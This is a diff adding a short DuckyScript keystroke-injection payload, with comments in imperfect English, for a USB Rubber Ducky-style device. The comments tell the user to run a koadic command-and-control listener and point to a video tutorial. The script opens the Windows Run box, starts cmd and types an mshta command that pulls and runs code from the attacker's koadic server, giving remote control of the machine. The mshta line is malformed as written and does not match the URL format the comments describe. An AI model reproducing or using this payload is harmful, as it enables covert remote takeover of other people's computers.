@@ -1,0 +1,23 @@
+REM Befor this program would work, you need to prepaer a few things first.
+
+REM 1) You need to have "koadic" install on a linux machine.
+REM 2) Use koadic to set up a listening server.
+
+REM You can use this video as inspiration https://www.youtube.com/watch?v=UImsfTpYjvU&list=WL&index=20&t=156s&ab_channel=LoiLiangYang
+
+REM Notice that i use a danish keyboard so you mite have to change the code for you keyboard.
+
+GUI r
+DELAY 200
+STRING cmd
+DELAY 200
+ENTER
+DELAY 300
+
+REM Here you need to write the link like this...
+REM http://(The SRVHOST):(THE SRVPORT)/(The ENDPOINT)
+REM You will find the SRVHOST, SRVPORT and the ENDPOINT in koadic info.
+
+STRING mshta http>&&SRVHOST>SRVPORT&ENDPOINT
+DELAY 200
+ENTER
